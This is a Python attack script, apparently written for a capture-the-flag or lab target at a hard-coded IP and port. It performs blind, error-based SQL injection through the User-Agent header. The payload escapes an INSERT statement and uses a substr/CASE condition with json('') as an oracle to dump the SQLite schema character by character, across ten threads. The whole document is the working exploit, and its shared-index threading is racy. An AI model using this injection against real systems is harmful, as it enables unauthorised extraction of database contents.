import requests
import string
import threading

url = 'http://103.97.125.56:30662'
fuzzing = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_'

# Shared index
index = 1
lock = threading.Lock()

def fuzz_sqlite_char(i):
    global index
    while True:
        with lock:
            current_index = index

        headers = {
            "User-Agent": f"hiepck','','','',''), ((SELECT CASE WHEN substr((SELECT sql FROM sqlite_master), {current_index}, 1) = '{i}' THEN json('') ELSE 'Does not start with V' END as result),'','','','','')-- -"
        }
        res = requests.get(url, headers=headers)
        
        if res.text != 'Logged':
            with lock:
                index += 1
            print(f"{i}", end="", flush=True)
            break

# Thread worker function
def worker():
    while True:
        for char in fuzzing:
            fuzz_sqlite_char(char)

# Number of threads (tune this number based on the server's performance)
thread_count = 10
threads = []

# Creating and starting threads
for _ in range(thread_count):
    t = threading.Thread(target=worker)
    t.start()
    threads.append(t)

# Join threads to wait for completion
for t in threads:
    t.join()
